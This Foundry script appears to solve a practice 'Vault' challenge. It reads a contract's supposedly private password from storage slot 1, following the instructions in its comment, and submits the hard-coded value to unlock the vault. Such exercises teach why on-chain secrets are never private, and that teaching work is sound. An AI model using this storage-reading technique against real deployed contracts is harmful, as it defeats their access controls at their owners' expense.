// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultSolution is Script {
    Vault public vault = Vault(0xe57e5D67bc82d86868B042fBe7417f89F3543a90);

    // Getting the private password using cast "cast storage <address> 1" because the password is in slot 1

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vault.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        console.log("The vault is now locked: ", vault.locked());
        vm.stopBroadcast();
    }
}
